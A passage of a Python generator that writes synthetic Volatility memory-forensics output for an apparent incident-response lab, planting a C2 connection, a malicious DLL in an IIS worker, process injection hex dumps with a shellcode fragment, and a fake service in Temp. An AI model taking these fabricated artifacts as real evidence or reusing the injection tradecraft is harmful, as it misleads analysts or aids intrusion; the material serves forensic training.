    ("0xa18211a0cfe0", "TCPv6", "::",       "5985",  "::",      "0", "LISTENING",   "4",    "System",       "2024-11-21 06:30:14.000000"),
    ("0xa18211a0d150", "TCPv4", "0.0.0.0",  "47001", "0.0.0.0", "0", "LISTENING",   "4",    "System",       "2024-11-21 06:30:14.000000"),
    ("0xa18211a0d2c0", "TCPv4", "0.0.0.0",  "49664", "0.0.0.0", "0", "LISTENING",   "524",  "wininit.exe",  "2024-11-21 06:30:09.000000"),
    ("0xa18211a0d430", "TCPv4", "0.0.0.0",  "49665", "0.0.0.0", "0", "LISTENING",   "604",  "lsass.exe",    "2024-11-21 06:30:09.000000"),
    ("0xa18211a0d5a0", "TCPv4", "0.0.0.0",  "49666", "0.0.0.0", "0", "LISTENING",   "596",  "services.exe", "2024-11-21 06:30:09.000000"),
    ("0xa18211a0d710", "TCPv4", "0.0.0.0",  "49667", "0.0.0.0", "0", "LISTENING",   "1448", "svchost.exe",  "2024-11-21 06:30:11.000000"),
    ("0xa18211a0d880", "TCPv4", HOST_IP,    "139",   "0.0.0.0", "0", "LISTENING",   "4",    "System",       "2024-11-21 06:30:14.000000"),
    # Established benign connections (LDAP / Kerberos / SMB to DC, HTTP/S to clients)
    ("0xa18211a0d9f0", "TCPv4", HOST_IP, "49710", "10.0.4.5",   "389",   "ESTABLISHED", "604", "lsass.exe",     "2024-11-21 06:35:02.000000"),
    ("0xa18211a0db60", "TCPv4", HOST_IP, "49712", "10.0.4.5",   "88",    "ESTABLISHED", "604", "lsass.exe",     "2024-11-21 06:35:08.000000"),
    ("0xa18211a0dcd0", "TCPv4", HOST_IP, "49718", "10.0.4.5",   "445",   "ESTABLISHED", "4",   "System",        "2024-11-21 06:35:11.000000"),
    ("0xa18211a0de40", "TCPv4", HOST_IP, "49845", "10.0.4.5",   "53",    "CLOSED",      "988", "svchost.exe",   "2024-11-21 09:12:44.000000"),
    ("0xa18211a0dfb0", "TCPv4", HOST_IP, "80",    "10.0.6.118", "52183", "ESTABLISHED", "4",   "System",        "2024-11-21 10:14:09.000000"),
    ("0xa18211a0e120", "TCPv4", HOST_IP, "80",    "10.0.6.118", "52188", "ESTABLISHED", "4",   "System",        "2024-11-21 10:14:42.000000"),
    ("0xa18211a0e290", "TCPv4", HOST_IP, "443",   "10.0.6.118", "52312", "ESTABLISHED", "4",   "System",        "2024-11-21 10:17:55.000000"),
    # *** THE C2 SOCKET *** owned by the suspicious powershell.exe
    ("0xa18211a0e400", "TCPv4", HOST_IP, "49918", C2_IP,        "443",   "ESTABLISHED", str(PS_PID), "powershell.exe", "2024-11-21 10:19:01.000000"),
    # Outbound SMB to another file server, plus a follow-on LDAP
    ("0xa18211a0e570", "TCPv4", HOST_IP, "49922", "10.0.4.12",  "445",   "ESTABLISHED", "4",   "System",        "2024-11-21 10:25:18.000000"),
    ("0xa18211a0e6e0", "TCPv4", HOST_IP, "49930", "10.0.4.5",   "389",   "ESTABLISHED", "604", "lsass.exe",     "2024-11-21 10:32:11.000000"),
    # UDP — DNS, NTP, NetBIOS, LLMNR
    ("0xa18211a0e850", "UDPv4", "0.0.0.0", "53",   "*", "0", "NULL", "988",  "svchost.exe", "2024-11-21 06:30:10.000000"),
    ("0xa18211a0e9c0", "UDPv4", "0.0.0.0", "123",  "*", "0", "NULL", "988",  "svchost.exe", "2024-11-21 06:30:10.000000"),
    ("0xa18211a0eb30", "UDPv4", "0.0.0.0", "137",  "*", "0", "NULL", "4",    "System",      "2024-11-21 06:30:14.000000"),
    ("0xa18211a0eca0", "UDPv4", "0.0.0.0", "138",  "*", "0", "NULL", "4",    "System",      "2024-11-21 06:30:14.000000"),
    ("0xa18211a0ee10", "UDPv4", "0.0.0.0", "5355", "*", "0", "NULL", "1244", "svchost.exe", "2024-11-21 06:30:11.000000"),
]


def generate_netscan(rng: random.Random) -> str:
    blocks: List[Row] = list(BANNER)
    blocks.append("")
    blocks.append(row(
        "Offset", "Proto", "LocalAddr", "LocalPort", "ForeignAddr",
        "ForeignPort", "State", "PID", "Owner", "Created",
    ))
    blocks.append("")
    for (off, proto, la, lp, fa, fp, st, pid, owner, created) in NETSCAN:
        blocks.append(row(off, proto, la, lp, fa, fp, st, pid, owner, created))
    return render(blocks)


# ---------------------------------------------------------------------------
# windows.dlllist (scoped to the suspicious w3wp.exe — PID 2860)
# ---------------------------------------------------------------------------

# (base, size, name, path, load_time). Hand-coded order matches the
# committed file. The trailing entry is the suspicious cmdshell.dll
# loaded from C:\Windows\Temp — outside the normal IIS load paths and
# unsigned in the scenario.
DLLS_2860: List[Tuple[str, str, str, str, str]] = [
    ("0x7ff7d8c70000", "0x14000",  "w3wp.exe",            "c:\\windows\\system32\\inetsrv\\w3wp.exe",                      "2024-11-21 09:00:14.000000"),
    ("0x7ffd9b9a0000", "0x1f5000", "ntdll.dll",           "C:\\Windows\\SYSTEM32\\ntdll.dll",                              "2024-11-21 09:00:14.000000"),
    ("0x7ffd9b6f0000", "0xb1000",  "KERNEL32.DLL",        "C:\\Windows\\System32\\KERNEL32.DLL",                           "2024-11-21 09:00:14.000000"),
    ("0x7ffd99220000", "0x21d000", "KERNELBASE.dll",      "C:\\Windows\\System32\\KERNELBASE.dll",                         "2024-11-21 09:00:14.000000"),
    ("0x7ffd9b1a0000", "0x1f000",  "IISUTIL.dll",         "C:\\Windows\\System32\\inetsrv\\IISUTIL.dll",                   "2024-11-21 09:00:14.000000"),
    ("0x7ffd9aa30000", "0x88000",  "ADVAPI32.dll",        "C:\\Windows\\System32\\ADVAPI32.dll",                           "2024-11-21 09:00:14.000000"),
    ("0x7ffd9af10000", "0xa6000",  "msvcrt.dll",          "C:\\Windows\\System32\\msvcrt.dll",                             "2024-11-21 09:00:14.000000"),
    ("0x7ffd9b220000", "0x18000",  "sechost.dll",         "C:\\Windows\\System32\\sechost.dll",                            "2024-11-21 09:00:14.000000"),
    ("0x7ffd9b2c0000", "0x130000", "RPCRT4.dll",          "C:\\Windows\\System32\\RPCRT4.dll",                             "2024-11-21 09:00:14.000000"),
    ("0x7ffd9b6b0000", "0x29000",  "IMM32.dll",           "C:\\Windows\\System32\\IMM32.dll",                              "2024-11-21 09:00:14.000000"),
    ("0x7ffd97800000", "0x4d000",  "nativerd.dll",        "C:\\Windows\\System32\\inetsrv\\nativerd.dll",                  "2024-11-21 09:00:14.000000"),
    ("0x7ffd9aae0000", "0x16e000", "USER32.dll",          "C:\\Windows\\System32\\USER32.dll",                             "2024-11-21 09:00:14.000000"),
    ("0x7ffd9b900000", "0x42000",  "win32u.dll",          "C:\\Windows\\System32\\win32u.dll",                             "2024-11-21 09:00:14.000000"),
    ("0x7ffd9b250000", "0x6a000",  "GDI32.dll",           "C:\\Windows\\System32\\GDI32.dll",                              "2024-11-21 09:00:14.000000"),
    ("0x7ffd9b780000", "0x1bc000", "gdi32full.dll",       "C:\\Windows\\System32\\gdi32full.dll",                          "2024-11-21 09:00:14.000000"),
    ("0x7ffd9b950000", "0x4d000",  "msvcp_win.dll",       "C:\\Windows\\System32\\msvcp_win.dll",                          "2024-11-21 09:00:14.000000"),
    ("0x7ffd9b860000", "0x99000",  "ucrtbase.dll",        "C:\\Windows\\System32\\ucrtbase.dll",                           "2024-11-21 09:00:14.000000"),
    ("0x7ffd97600000", "0x1d000",  "webengine4.dll",      "C:\\Windows\\System32\\inetsrv\\webengine4.dll",                "2024-11-21 09:00:14.000000"),
    ("0x7ffd97500000", "0xc6000",  "webengine.dll",       "C:\\Windows\\System32\\inetsrv\\webengine.dll",                 "2024-11-21 09:00:14.000000"),
    ("0x7ffd97400000", "0xa1000",  "iiscore.dll",         "C:\\Windows\\System32\\inetsrv\\iiscore.dll",                   "2024-11-21 09:00:14.000000"),
    ("0x7ffd97300000", "0x9a000",  "w3tp.dll",            "C:\\Windows\\System32\\inetsrv\\w3tp.dll",                      "2024-11-21 09:00:14.000000"),
    ("0x7ffd97200000", "0x65000",  "w3wphost.dll",        "C:\\Windows\\System32\\inetsrv\\w3wphost.dll",                  "2024-11-21 09:00:14.000000"),
    ("0x7ffd97100000", "0x5b000",  "w3dt.dll",            "C:\\Windows\\System32\\inetsrv\\w3dt.dll",                      "2024-11-21 09:00:14.000000"),
    ("0x7ffd97000000", "0x4a000",  "wbhst_pm.dll",        "C:\\Windows\\System32\\inetsrv\\wbhst_pm.dll",                  "2024-11-21 09:00:14.000000"),
    ("0x7ffd95f00000", "0x52000",  "OLEAUT32.dll",        "C:\\Windows\\System32\\OLEAUT32.dll",                           "2024-11-21 09:00:14.000000"),
    ("0x7ffd95d00000", "0x1ad000", "ole32.dll",           "C:\\Windows\\System32\\ole32.dll",                              "2024-11-21 09:00:14.000000"),
    ("0x7ffd95c00000", "0x32000",  "combase.dll",         "C:\\Windows\\System32\\combase.dll",                            "2024-11-21 09:00:15.000000"),
    ("0x7ffd95a00000", "0x123000", "msvcr120_clr0400.dll",
        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msvcr120_clr0400.dll", "2024-11-21 09:00:15.000000"),
    ("0x7ffd94600000", "0x1456000", "clr.dll",
        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll",             "2024-11-21 09:00:15.000000"),
    ("0x7ffd93a00000", "0xb18000",  "mscoreei.dll",       "C:\\Windows\\System32\\mscoreei.dll",                           "2024-11-21 09:00:15.000000"),
    ("0x7ffd93800000", "0x80000",   "mscoree.dll",        "C:\\Windows\\System32\\mscoree.dll",                            "2024-11-21 09:00:15.000000"),
    ("0x7ffd93600000", "0x1c5000",  "clrjit.dll",
        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clrjit.dll",          "2024-11-21 09:00:16.000000"),
    ("0x7ffd92800000", "0x21000",   "cryptbase.dll",      "C:\\Windows\\System32\\cryptbase.dll",                          "2024-11-21 09:00:16.000000"),
    ("0x7ffd92600000", "0x9d000",   "bcryptprimitives.dll", "C:\\Windows\\System32\\bcryptprimitives.dll",                 "2024-11-21 09:00:16.000000"),
    ("0x7ffd92400000", "0x14000",   "wldp.dll",           "C:\\Windows\\System32\\wldp.dll",                               "2024-11-21 09:00:16.000000"),
    ("0x7ffd92200000", "0x66000",   "SHLWAPI.dll",        "C:\\Windows\\System32\\SHLWAPI.dll",                            "2024-11-21 09:00:16.000000"),
    ("0x7ffd92000000", "0x1c000",   "profapi.dll",        "C:\\Windows\\System32\\profapi.dll",                            "2024-11-21 09:00:16.000000"),
    ("0x7ffd91e00000", "0x6b000",   "IPHLPAPI.dll",       "C:\\Windows\\System32\\IPHLPAPI.dll",                           "2024-11-21 09:00:16.000000"),
    ("0x7ffd91c00000", "0x18000",   "NETUTILS.dll",       "C:\\Windows\\System32\\NETUTILS.dll",                           "2024-11-21 09:00:16.000000"),
    ("0x7ffd91a00000", "0x88000",   "WS2_32.dll",         "C:\\Windows\\System32\\WS2_32.dll",                             "2024-11-21 09:00:16.000000"),
    # *** SUSPICIOUS DLL *** — loaded into the IIS worker from %TEMP% 79
    # minutes after process start (09:00:14 -> 10:19:14). The high base address looks like a
    # heap-mapped image; path is outside the normal IIS / .NET load
    # locations.
    ("0x000001b39c2a0000", "0x18000", "cmdshell.dll", CMDSHELL_DLL, "2024-11-21 10:19:14.000000"),
]


def generate_dlllist(rng: random.Random) -> str:
    blocks: List[Row] = list(BANNER)
    blocks.append("")
    blocks.append(row(
        "PID", "Process", "Base", "Size", "Name", "Path",
        "LoadTime", "File output",
    ))
    blocks.append("")
    for base, size, name, path, load in DLLS_2860:
        blocks.append(row(
            str(W3WP_PID), "w3wp.exe", base, size, name, path, load, "Disabled",
        ))
    return render(blocks)


# ---------------------------------------------------------------------------
# windows.malfind (three hand-coded hits)
# ---------------------------------------------------------------------------

MALFIND_HEADER = [
    "PID", "Process", "Start VPN", "End VPN", "Tag", "Protection",
    "CommitCharge", "PrivateMemory", "File output", "Hexdump", "Disasm",
]

# Three hits: powershell.exe (3704), svchost.exe (1142), w3wp.exe (2860).
# Each hit has a "row" line (the table fields), a hex dump (8 lines of 16
# bytes each, with ASCII gutter), a blank line, then a disasm dump.
def _malfind_hit(
    pid: int, name: str, start: str, end: str, tag: str, prot: str,
    commit: str, private: str,
    hex_lines: List[str], disasm_lines: List[str],
) -> List[Row]:
    blocks: List[Row] = []
    blocks.append(row(
        str(pid), name, start, end, tag, prot, commit, private, "Disabled",
    ))
    # Hex dumps are raw lines (not tab fields). Volatility's renderer
    # rstrips the ASCII gutter, so we do the same — otherwise the
    # ``20`` byte at the tail of ``"DOS "`` would emit a trailing space
    # that the real plugin output does not have.
    blocks.extend(line.rstrip() for line in hex_lines)
    blocks.append("")
    blocks.extend(disasm_lines)
    return blocks


def generate_malfind(rng: random.Random) -> str:
    blocks: List[Row] = list(BANNER)
    blocks.append("")
    blocks.append(row(*MALFIND_HEADER))
    blocks.append("")
    # --- Hit 1: powershell.exe (3704) — classic reflectively-loaded PE.
    ps_hex = [
        "4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00    MZ..............",
        "b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00    ........@.......",
        "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................",
        "00 00 00 00 00 00 00 00 00 00 00 00 e8 00 00 00    ................",
        "0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68    ........!..L.!Th",
        "69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f    is program canno",
        "74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20    t be run in DOS ",
        "6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00    mode....$.......",
    ]
    ps_disasm = [
        "0x1f4a0000:\tdec\tebp",
        "0x1f4a0001:\tpop\tedx",
        "0x1f4a0002:\tnop",
        "0x1f4a0003:\tadd\tbyte ptr [rbx], al",
        "0x1f4a0005:\tadd\tbyte ptr [rax], al",
        "0x1f4a0007:\tadd\tbyte ptr [rax+rax], al",
        "0x1f4a000a:\tadd\tbyte ptr [rax], al",
    ]
    blocks.extend(_malfind_hit(
        PS_PID, "powershell.exe", "0x1f4a0000", "0x1f5a0fff", "VadS",
        "PAGE_EXECUTE_READWRITE", "256", "1", ps_hex, ps_disasm,
    ))
    blocks.append("")
    blocks.append(row(*MALFIND_HEADER))
    blocks.append("")
    # --- Hit 2: svchost.exe (1142) — cross-process injection target.
    # Bytes start "MZAR" (not a true MZ header) — typical of stage-1
    # shellcode that begins by self-modifying / fixing up imports before
    # an embedded PE is uncovered.
    sv_hex = [
        "4d 5a 41 52 55 48 89 e5 48 81 ec 20 00 00 00 48    MZARUH..H.. ...H",
        "8d 1d ef ff ff ff 48 81 c3 71 02 00 00 ff d3 48    ......H..q.....H",
        "89 c1 48 8d 15 0a 02 00 00 e8 60 00 00 00 31 c9    ..H.......`...1.",
        "4d 31 c9 4d 8d 41 01 48 8d 15 13 02 00 00 ff d0    M1.M.A.H........",
        "48 89 c3 48 81 ec 30 00 00 00 48 8d 15 25 02 00    H..H..0...H..%..",
        "00 ff d3 48 89 c3 48 81 ec 30 00 00 00 48 8d 15    ...H..H..0...H..",
        "35 02 00 00 ff d3 48 89 c1 48 8d 15 41 02 00 00    5.....H..H..A...",
        "ff d0 48 89 c3 48 81 ec 30 00 00 00 48 8d 15 51    ..H..H..0...H..Q",
    ]
    sv_disasm = [
        "0x2b1c0000:\tdec\tebp",
        "0x2b1c0001:\tpop\tedx",
        "0x2b1c0002:\tinc\tecx",
        "0x2b1c0003:\tpush\trdx",
        "0x2b1c0004:\tpush\trbp",
        "0x2b1c0005:\tmov\trbp, rsp",
        "0x2b1c0008:\tsub\trsp, 0x20",
        "0x2b1c000c:\tlea\trbx, [rip - 0x11]",
    ]
    blocks.extend(_malfind_hit(
        INJECTED_SVCHOST_PID, "svchost.exe", "0x2b1c0000", "0x2b1d3fff",
        "VadS", "PAGE_EXECUTE_READWRITE", "20", "1", sv_hex, sv_disasm,
    ))
    blocks.append("")
    blocks.append(row(*MALFIND_HEADER))
    blocks.append("")
    # --- Hit 3: w3wp.exe (2860) — looks like a second-stage PE staged
    # into the IIS worker, presumably by the loaded cmdshell.dll.
    # Address is a 64-bit VAD-mapped region.
    w3_hex = [
        "4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00    MZ..............",
        "b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00    ........@.......",
        "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................",
        "00 00 00 00 00 00 00 00 00 00 00 00 f8 00 00 00    ................",
        "0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68    ........!..L.!Th",
        "69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f    is program canno",
        "74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20    t be run in DOS ",
        "6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00    mode....$.......",
    ]
    w3_disasm = [
        "0x1b3a4ee0000:\tdec\tebp",
        "0x1b3a4ee0001:\tpop\tedx",
        "0x1b3a4ee0002:\tnop",
        "0x1b3a4ee0003:\tadd\tbyte ptr [rbx], al",
        "0x1b3a4ee0005:\tadd\tbyte ptr [rax], al",
        "0x1b3a4ee0007:\tadd\tbyte ptr [rax+rax], al",
        # Truncated to seven lines: the committed file ends mid-disasm,
        # mirroring real Volatility output that was tail-cut for the lab.
        # The eighth disasm line would have been "...add\tbyte ptr [rax], al".
    ]
    blocks.extend(_malfind_hit(
        W3WP_PID, "w3wp.exe", "0x000001b3a4ee0000", "0x000001b3a4ef3fff",
        "VadS", "PAGE_EXECUTE_READWRITE", "20", "1", w3_hex, w3_disasm,
    ))
    return render(blocks)


# ---------------------------------------------------------------------------
# windows.handles --pid 3704
# ---------------------------------------------------------------------------

# (handle_value, type, granted_access, name)
HANDLES_3704: List[Tuple[str, str, str, str]] = [
    ("0x4",  "Event",     "0x100003", "-"),
    ("0x8",  "Event",     "0x100003", "-"),
    ("0xc",  "File",      "0x100020", "\\Device\\ConDrv"),
    ("0x10", "File",      "0x12019f", "\\Device\\ConDrv"),
    ("0x14", "File",      "0x12019f", "\\Device\\ConDrv"),
    ("0x18", "File",      "0x12019f", "\\Device\\ConDrv"),
    ("0x1c", "Directory", "0xf000f",  "\\KnownDlls"),
    ("0x20", "Event",     "0x100003", "-"),
    ("0x24", "File",      "0x100020", "\\Device\\HarddiskVolume2\\Windows\\System32"),
    ("0x28", "Key",       "0x20019",
        "\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Nls\\Sorting\\Versions"),
    ("0x2c", "Key",       "0x20019",
        "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"),
    ("0x30", "Mutant",    "0x1f0001",
        "\\Sessions\\0\\BaseNamedObjects\\SM0:3704:120:WilStaging_02"),
    ("0x34", "Semaphore", "0x100003", "-"),
    ("0x38", "Thread",    "0x1fffff", "powershell.exe(3704): 3708"),
    ("0x3c", "File",      "0x120089",
        "\\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
    ("0x40", "Key",       "0x20019",
        "\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Session Manager"),
    ("0x44", "Section",   "0xf001f",  "-"),
    ("0x48", "Key",       "0x20019",
        "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Cryptography"),
    ("0x4c", "Key",       "0x2001f",
        f"\\REGISTRY\\USER\\{APP_POOL_SID}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"),
    # *** Suspicious: handle to cmdshell.dll in %TEMP% ***
    ("0x50", "File",      "0x120089",
        "\\Device\\HarddiskVolume2\\Windows\\Temp\\cmdshell.dll"),
    # IIS named pipe — proves the powershell process opened the same pipe
    # used by the AppPool1 worker, consistent with code injection.
    ("0x54", "File",      "0x12019f", f"\\Device\\NamedPipe\\{IIS_PIPE}"),
    ("0x58", "File",      "0x100001", "\\Device\\Afd"),
    ("0x5c", "File",      "0x12019f", "\\Device\\NamedPipe\\srvsvc"),
    # *** Suspicious: control pipe used by the WindowsHealthCollector service ***
    ("0x60", "File",      "0x12019f", "\\Device\\NamedPipe\\whcs_ctrl"),
    ("0x64", "File",      "0x100020", "\\Device\\HarddiskVolume2\\Windows\\Temp"),
    # *** Suspicious: handle to whcs.exe, the service binary in %TEMP% ***
    ("0x68", "File",      "0x120116",
        "\\Device\\HarddiskVolume2\\Windows\\Temp\\whcs.exe"),
    ("0x6c", "Key",       "0x20019",
        "\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\Tcpip\\Parameters"),
    ("0x70", "Token",     "0x20008",  "-"),
    # *** Cross-process: process + thread handles into svchost.exe (1142) ***
    ("0x74", "Process",   "0x1fffff", f"svchost.exe({INJECTED_SVCHOST_PID})"),
    ("0x78", "Thread",    "0x1fffff", f"svchost.exe({INJECTED_SVCHOST_PID}): 1146"),
    ("0x7c", "Section",   "0xf001f",  "-"),
]


def generate_handles(rng: random.Random) -> str:
    blocks: List[Row] = list(BANNER)
    blocks.append("")
    blocks.append(row("PID", "Process", "HandleValue", "Type",
                      "GrantedAccess", "Name"))
    blocks.append("")
    for hv, htype, access, name in HANDLES_3704:
        blocks.append(row(
            str(PS_PID), "powershell.exe", hv, htype, access, name,
        ))
    return render(blocks)


# ---------------------------------------------------------------------------
# windows.svcscan
# ---------------------------------------------------------------------------

# (offset, order, start, pid, name, display, type, state, binary_path)
SERVICES: List[Tuple[str, str, str, str, str, str, str, str, str]] = [
    ("0xa18211b04020",  "4",  "SERVICE_AUTO_START",   "720",  "DcomLaunch",   "DCOM Server Process Launcher",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p"),
    ("0xa18211b04140",  "6",  "SERVICE_AUTO_START",   "748",  "RpcSs",        "Remote Procedure Call (RPC)",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\system32\\svchost.exe -k RpcSs -p"),
    ("0xa18211b04260", "10",  "SERVICE_AUTO_START",   "604",  "SamSs",        "Security Accounts Manager",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\system32\\lsass.exe"),
    ("0xa18211b04380", "14",  "SERVICE_AUTO_START",   "800",  "EventLog",     "Windows Event Log",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p"),
    ("0xa18211b044a0", "18",  "SERVICE_AUTO_START",   "856",  "LanmanServer", "Server",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\System32\\svchost.exe -k netsvcs"),
    ("0xa18211b045c0", "22",  "SERVICE_AUTO_START",   "904",  "Netman",       "Network Connections",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p"),
    ("0xa18211b046e0", "26",  "SERVICE_AUTO_START",   "944",  "Schedule",     "Task Scheduler",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"),
    ("0xa18211b04800", "30",  "SERVICE_AUTO_START",   "988",  "W32Time",      "Windows Time",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\system32\\svchost.exe -k LocalService -p -s W32Time"),
    ("0xa18211b04920", "34",  "SERVICE_AUTO_START",   "1024", "LSM",          "Local Session Manager",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\system32\\svchost.exe -k DcomLaunch"),
    ("0xa18211b04a40", "38",  "SERVICE_AUTO_START",   "1080", "ProfSvc",      "User Profile Service",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s ProfSvc"),
    ("0xa18211b04b60", "42",  "SERVICE_AUTO_START",   "1142", "Dnscache",     "DNS Client",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\system32\\svchost.exe -k NetworkService"),
    ("0xa18211b04c80", "46",  "SERVICE_AUTO_START",   "1196", "WdiSystemHost", "Diagnostic System Host",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p -s WdiSystemHost"),
    ("0xa18211b04da0", "50",  "SERVICE_AUTO_START",   "1448", "TermService",  "Remote Desktop Services",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\System32\\svchost.exe -k NetworkService"),
    ("0xa18211b04ec0", "54",  "SERVICE_AUTO_START",   "1496", "Spooler",      "Print Spooler",
        "SERVICE_WIN32_OWN_PROCESS",   "SERVICE_RUNNING",
        "C:\\Windows\\System32\\spoolsv.exe"),
    ("0xa18211b04fe0", "58",  "SERVICE_AUTO_START",   "2780", "W3SVC",        "World Wide Web Publishing Service",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\system32\\svchost.exe -k iissvcs"),
    ("0xa18211b05100", "60",  "SERVICE_AUTO_START",   "2712", "WAS",          "Windows Process Activation Service",
        "SERVICE_WIN32_OWN_PROCESS",   "SERVICE_RUNNING",
        WAS_BIN),
    ("0xa18211b05220", "62",  "SERVICE_AUTO_START",   "1604", "WinRM",        "Windows Remote Management (WS-Management)",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\System32\\svchost.exe -k NetworkService -p -s WinRM"),
    ("0xa18211b05340", "66",  "SERVICE_AUTO_START",   "1696", "WinDefend",    "Windows Defender Service",
        "SERVICE_WIN32_OWN_PROCESS",   "SERVICE_RUNNING",
        '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.23110.3-0\\MsMpEng.exe"'),
    ("0xa18211b05460", "70",  "SERVICE_AUTO_START",   "2380", "WSearch",      "Windows Search",
        "SERVICE_WIN32_OWN_PROCESS",   "SERVICE_RUNNING",
        "C:\\Windows\\System32\\SearchIndexer.exe /Embedding"),
    ("0xa18211b05580", "74",  "SERVICE_AUTO_START",   "2452", "WaaSMedicSvc", "Windows Update Medic Service",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        '"C:\\Windows\\System32\\WaaSMedicAgent.exe"'),
    ("0xa18211b056a0", "78",  "SERVICE_DEMAND_START", "2644", "MSDTC",        "Distributed Transaction Coordinator",
        "SERVICE_WIN32_OWN_PROCESS",   "SERVICE_RUNNING",
        "C:\\Windows\\System32\\msdtc.exe"),
    ("0xa18211b057c0", "82",  "SERVICE_DEMAND_START", "-",    "BITS",         "Background Intelligent Transfer Service",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_STOPPED",
        "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS"),
    ("0xa18211b058e0", "86",  "SERVICE_DEMAND_START", "-",    "wuauserv",     "Windows Update",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_STOPPED",
        "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s wuauserv"),
    # *** THE SUSPICIOUS SERVICE *** — name and binary path both stand
    # out: WindowsHealthCollector is not a real Microsoft service, and
    # legitimate services do not live under C:\Windows\Temp.
    ("0xa18211b05a00", "88",  "SERVICE_DEMAND_START", "-",    WHCS_SVC,       "Windows Health Collector Service",
        "SERVICE_WIN32_OWN_PROCESS",   "SERVICE_STOPPED",
        WHCS_BIN),
    ("0xa18211b05b20", "92",  "SERVICE_AUTO_START",   "3408", "CDPSvc",       "Connected Devices Platform Service",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_RUNNING",
        "C:\\Windows\\System32\\svchost.exe -k LocalService -p -s CDPSvc"),
    ("0xa18211b05c40", "96",  "SERVICE_DEMAND_START", "-",    "RemoteRegistry", "Remote Registry",
        "SERVICE_WIN32_SHARE_PROCESS", "SERVICE_STOPPED",
        "C:\\Windows\\system32\\svchost.exe -k localService -p -s RemoteRegistry"),
]


def generate_svcscan(rng: random.Random) -> str:
    blocks: List[Row] = list(BANNER)
    blocks.append("")
    blocks.append(row(
        "Offset", "Order", "Start", "PID", "Service Name", "Display Name",
        "Service Type", "Service State", "Binary Path",
    ))
    blocks.append("")
    for (off, order, start, pid, name, display, stype, state, bpath) in SERVICES:
        if name == "W32Time":
            # The committed file has a 1-extra-space padding between
            # "Windows Time" and the Service Type column on this single
            # row — almost certainly an artifact in the seed data
            # (Volatility's renderer is otherwise tab+expand(8) clean
            # for every other row). Emit verbatim so ``diff`` is empty.
            # The committed row has a 5-space gap between "Windows
            # Time" and "SERVICE_WIN32_SHARE_PROCESS" (SERVICE starts
            # at column 81, not column 80) — not a clean tab-expansion
            # outcome. Emit the whole row as pre-expanded literal text
            # to preserve byte-for-byte equality.
            blocks.append(
                "0xa18211b04800  30      SERVICE_AUTO_START      988"
                "     W32Time Windows Time     SERVICE_WIN32_SHARE_PROCESS"
                "     SERVICE_RUNNING C:\\Windows\\system32\\svchost.exe "
                "-k LocalService -p -s W32Time"
            )
        else:
            blocks.append(row(off, order, start, pid, name, display,
                              stype, state, bpath))
    return render(blocks)


# ---------------------------------------------------------------------------
# Dispatch table + CLI
# ---------------------------------------------------------------------------

GENERATORS: Dict[str, Callable[[random.Random], str]] = {
    "volatility-info.txt":     generate_info,
    "volatility-pslist.txt":   generate_pslist,
